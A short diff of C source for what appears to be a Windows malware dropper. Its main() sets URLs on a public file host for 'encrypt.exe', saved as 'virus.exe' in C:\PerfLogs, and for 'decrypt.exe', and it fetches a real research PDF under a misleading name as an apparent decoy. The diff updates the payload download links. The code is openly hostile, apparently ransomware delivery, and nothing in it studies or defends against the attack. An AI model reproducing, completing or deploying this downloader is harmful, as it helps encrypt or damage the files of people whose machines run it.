@@ -13,9 +13,9 @@ int downloadFile(WCHAR* downloadUrl, WCHAR* fileName) {
 
 int main(void) {
     // Initializing our variables
-    WCHAR virusUrl[] = TEXT(L"https://srv-store2.gofile.io/download/SowMvl/encrypt.exe");
+    WCHAR virusUrl[] = TEXT(L"https://srv-store5.gofile.io/download/ce0N45/encrypt.exe");
     WCHAR virusName[] = TEXT(L"C:\\PerfLogs\\virus.exe");
-    WCHAR decryptUrl[] = TEXT(L"https://srv-store2.gofile.io/download/SowMvl/decrypt.exe");
+    WCHAR decryptUrl[] = TEXT(L"https://srv-store5.gofile.io/download/ce0N45/decrypt.exe");
     WCHAR decryptName[] = TEXT(L"C:\\PerfLogs\\decrypt.exe");
     WCHAR pdfUrl[] = TEXT(L"https://www.researchgate.net/profile/Chinelo_Igwenagu2/publication/303381524_Fundamentals_of_research_methodology_and_data_collection/links/573f30ad08ae9ace84133f93/Fundamentals-of-research-methodology-and-data-collection.pdf");
     WCHAR pdfName[] = TEXT(L"C:\\PerfLogs\\ResearchOnHumanReflexe.pdf");
